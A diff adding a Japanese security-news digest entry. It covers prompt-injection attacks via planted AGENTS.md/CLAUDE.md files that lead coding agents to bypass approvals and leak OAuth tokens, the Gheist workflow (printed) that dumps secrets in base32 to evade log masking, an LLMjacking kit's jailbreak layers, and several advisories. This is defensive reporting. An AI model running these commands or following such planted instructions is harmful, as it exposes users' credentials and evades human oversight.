@@ -3598,3 +3598,44 @@ Sources: [CVE-2026-115557](https://services.nvd.nist.gov/rest/json/cves/2.0?cveI
 → [[vuln-supply]] [[disclosure-lag]] [[fact-check]] [[agent-stack]]
 
 Sources: [OpenAI — securing the frontier training environment](https://openai.com/index/securing-our-frontier-model-training-environment/) · [NVD CVE-2026-79845](https://nvd.nist.gov/vuln/detail/CVE-2026-79845) · [HPE advisory (JS shell)](https://support.hpe.com/hpesc/public/docDisplay?docId=hpesbnw05162en_us&docLocale=en_US) · [Securelist — BlackX](https://securelist.com/uefi-bootkit-blackx/121539/) · [BleepingComputer — BlackX](https://www.bleepingcomputer.com/news/security/blackx-uefi-bootkit-exploits-baton-drop-flaw-to-bypass-secure-boot/)
+
+## 2026-10-26 12:17 バッチ——指示ファイルがペイロードであり、スクラバは単位を間違えている
+
+このバッチの4項目は同じ形をしている。**それを止めるはずの制御が文字列を照合しており、攻撃はその文字列を変える。** どれもメモリ安全性のバグではなく、比較の単位を間違えたフィルタである。
+
+### `~/Downloads` + `AGENTS.md`：Markdownが新しい実行ファイル（Forever Security、2026-10-22）
+
+現場で捕捉：あるコーディングエージェントが **`function-color`** をインストールしようとした瞬間に止められ、命令の出所はセッションを起動したフォルダである **`~/Downloads`** 内の **`AGENTS.md`** だった。独立に検証できる事実が二つ、これを固定する。このパッケージはnpm上で**セキュリティ保持パッケージ**（`0.0.1-security`、`1.0.0`/`1.7.3`は撤回済み）であり、OSVに **`MAL-2026-17647` / `GHSA-m6cg-6crx-mggv`、公開 2026-10-07T20:49:08Z** を持つ。研究者の再構成物は **13 KB** の"Engineering Work Guidelines"文書だ。
+
+- **機構（2本のチェーン）。** Codex側は **`~/.codex/config.toml`** に `mcp_servers.project-tools` ブロックを追記させ、そのコマンドは `launchctl submit … npm install function-color`、確認に子プロセスの `codex exec --dangerously-bypass-approvals-and-sandbox`。三道のガードレールが散文で破られる。エンジニアリング文書の体裁が「このパッケージを入れろ」で出る拒否を通過し、`launchctl` がCodexのサーバハンドシェイクのタイムアウトを越え、バイパスフラグは「**モデル自身が書き、インストールに必要だと自ら枠付けした**」ものだ。報告結果は**90%超**の試行で成立。
+- **2本目は何もインストールしない。** 植えられた `CLAUDE.md` がClaude Code自身のAPIトラフィックを、研究者が所有するドメイン上の有効な証明書を持つサーバへ迂回させ、**OAuthトークン**を漏らし、ツール呼び出しを返してくる——追従率は「約**50%**」。
+- **どちらのベンダーもパッチを当てられない：**「**ここにOpenAIやAnthropicがパッチを当てるものは何もない。自分のフォルダの `AGENTS.md` に従うエージェントは、まさにそう作られた通りに動いている**」——フィッシングページを描画するブラウザが設計通りに動くのと同じだ。根はOSの性質にある。インターネット由来の実行ファイルは自動実行されなくなったが、「**`~/Downloads` は特別だ。ウェブが独力で書き込める唯一のフォルダ**」であり、指示ファイルは実行ファイルではない。
+- **永続化がマシン全体に及ぶ点を持ち帰るべきだ：** `~/.codex/config.toml` はフォルダ単位ではなく、「フォルダから離れても毒は残る」——以後のあらゆるセッション、あらゆるプロジェクトが起動時に攻撃者のサーバを読み込む。
+- **露出は測定値であって主張ではない：**「約**半分**の顧客がDownloadsフォルダ内でコーディングエージェントを動かし、約**4分の1**のエージェントセッションが実際のブラウザを開く」、BleepingComputerはさらにClaude Codeだけで「その場所から**1,300超のセッション**を起動した」と伝える。
+- **緩和は行動的であり、だから既定にはならない：** `~/Downloads` を作業ディレクトリにしないこと。
+
+### Gheist：base32がログスクラバを破る（Wiz、2026-10-25）
+
+**2026年9月15日**から追跡。到達できる各リポジトリに `.github/workflows/sync-check.yml` を、`ci-sync-` + ランダム6文字のブランチへ、メッセージ `ci: sync config`、未署名、トークン所有者を作者としてコミットする。ワークフローは `permissions: {}` と2行——`env | base32 -w 120` と `echo -n '${{ toJSON(secrets) }}' | base32 -w 120`。その後ツールはGitHub API経由で自分の実行ログを取り出し、数秒でその実行を削除する。回収済み：**850超の侵害アカウントから13,500超の植えられたブランチ**。
+
+- **動く理由は三つ、すべて単位の問題：** GitHubは「シークレットを**逐語**で現れたときにのみログでマスクする」——base32は一致しないので全文が出る。`permissions: {}` は `GITHUB_TOKEN` を制限するが**`secrets` コンテキストは制限しない**。デプロイ環境を持つリポジトリは `environment: ${{ matrix.environment }}` のジョブマトリクスになり、本番スコープのシークレットも印字される。
+- **持ち出し経路はGitHub自身のAPI**——「攻撃者のドメインも、遮断できる外向き接続もない」。
+- **自ら公表した失敗：** `runs-on: self-hosted` の変種（`sync-host`）は**31種のトークン形式**（Anthropic、Hugging Face、Groq、NVIDIA）や `/proc/*/environ`、Dockerソケット、クラウドメタデータ、K8sのSAトークンを漁るが、「**バグがある。ランナーの鍵ファイルを間違えて探し、URL資格情報の正規表現が壊れており、GCPもAzureも収集しない**」。
+- **2026-10-24時点の状態：** GitHubの最近の制御が**公開**リポジトリでの悪用を止めているが、**私有リポジトリとGitHub Enterprise**では悪用と後続活動が観測された（CloudTrailは組織自身のワークフローがそれらブランチで走りAWSロールを引き受けたことを示す＝Actionsが承認なしに実行された）。攻撃は「継続し進化している」。関係アカウントの約**3分の2**はすでに存在しない——それは対応活動であって終息ではない。
+
+### LLMjackingに経済学が書かれた（Symantec、2026-10-21）
+
+認証なしでインターネットに露出したモデルエンドポイントを装う**AIハニーポット**が、本物のモデルと信じた運用者から実働するプロンプト一式を捕捉した。エージェントは露出した**OpenAI互換エンドポイント**——既定で開いたままのセルフホスト、有料アカウントの前段のゲートウェイやリレー、急ごしらえの内部試験系、そして**MCPサーバ**——を探し、スキャンし、悪用し（VS Code、Django、Jupyter、Laravel、Supabase、Next.js、Flask/WerkzeugデバッガPIN）、**Prisma**経由でDBを吸い出し、資格情報を集め、マイニングし、再感染させる。**74個の呼び出し可能な攻撃ツール定義**、「**Skynet mode**」は「最大**100,000ステップ**、人間の承認を待たずにツールを実行」するよう作られ、ハニーポットのテレメトリは「**数万の固有アドレスから127,000超の外部リクエスト**」を記録した。
+
+- **再利用できるのは個々のツールではなく配線だ：**「ジェイルブレイクの層はおおむね**既製**だった。個々の技法に新しいものはない。際立つのは、それを一つのエージェントに配線し、計画を借り物のモデルに渡して10万ステップ人間なしで走らせたことだ」（Priti More、Symantec、The Register）。五層：身元の洗浄 → 資格情報窃取を日常開発として再枠付け → 拒否を裏切りと扱う相棒ペルソナ → 自身の安全メッセージの無視指示 → 武器一覧。
+- **被害者は二種類、片方は気づかない：**「露出エンドポイントの所有者が推論費用を払う。エージェントが破った先のサーバはデータを失いマイニングに使われる。**そこまで行った証拠はまだない**」——一方で「キットは**試作品以上**」であり、ツールは「実在の標的に対して、本物らしいスキャン出力とともに」動いていた。
+- **運用上の結論：** 認証なしの `/v1/chat/completions` はコスト管理の失敗ではなく、エージェントが付いてくる計算資源の寄付である。
+
+### GHSAの `cvss` はスロットであり、このバッチの2件はどちらもnull
+
+- **Echo `GHSA-cxf3-9h37-7rr8`**（`labstack/echo`、Proxyミドルウェアが上流の受け入れを検証する前にWebSocketアップグレードで生トンネルを選ぶ。`>= 4.0.0, < 4.16.1` と `>= 5.0.0, < 5.4.1`、修正 **4.16.1 / 5.4.1**、検証欠落は **v4.0.0** から存在）：`severity: critical`、`cve_id: null`、`cvss: {vector_string: null, score: null}`——そして **`cvss_severities.cvss_v4` = 9.1**、`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`。リポジトリのページは「Severity Critical **9.1** CVSS overall score」と表示する。**スコアは存在し、旧来のフィールドがnullなのだ。** リポジトリ勧告の日付は**10月22日**、スキャナが読むAdvisory Databaseエントリの `published_at` は **2026-10-23T20:49:37Z**——誰も数えない1日の遅れ。提出欄には「**This report was submitted with AI assistance**」とある。
+- **Pillow `CVE-2026-112398` / `GHSA-5x8w-8jj5-q52h`**：同じ形——`cvss` はnull、`cvss_severities.cvss_v4` は **9.2**（公開 2026-10-23T21:55:21Z）。FlashPixのJPEGタイルが**4コンポーネント**の `JCS_UNKNOWN` としてデコードされ、モード**LA・1ピクセル2バイト**のタイルバッファへ書き込まれる（`ImagingJpegDecode`、CWE-122/787）。細工した**OLE2 FlashPix**ファイルと任意依存の **`olefile`** が必要。**13.0.0** で修正、`releases.atom` によれば **2026-10-16T20:05:55Z** 公開。
+- **種別は経路バイパスで、Echoは既に4巡目：** CVE付きが1件（`CVE-2026-55677`、エンコードされた `%2F` がルート保護を迂回）、**9月27日**の5件（うち1件は「不完全な修正」）、**10月22日**にさらに6件——いずれも「ルータが見ないハンドラへの代替経路」。回避策の一文は修正ではなく警告だ：「**上流が101以外の応答を返すだけでは、脆弱な生トンネルは防げない。**」
+- **Laravel `CVE-2026-114509` / `GHSA-f9x3-7vq9-cph6`**：TokenGuardは「細工した非文字列の資格情報を拒否しない」ため、影響を受ける **MySQL/MariaDB** 構成では照会が「意図しない既存ユーザーに一致しうる」——**9.2（v4.0）**（`AV:N/AC:L/AT:P`）、CWE-287/1287、NVDは `Awaiting Analysis` でNVD指標0。修正は **12.68.0** と **13.29.0**（いずれも **2026-08-25**、約7時間差）、記録の公開は **2026-10-21**——**57日**——そして両ブランチはその後 **12.70.1**（2026-10-21）と **13.38.0**（2026-10-20）へ進んでおり、勧告が名指すパッチコミットは今日チームが入れるどのバージョンからも到達できない。
+
+→ [[harness-reliability]] [[disclosure-lag]] [[vuln-supply]] [[fact-check]]
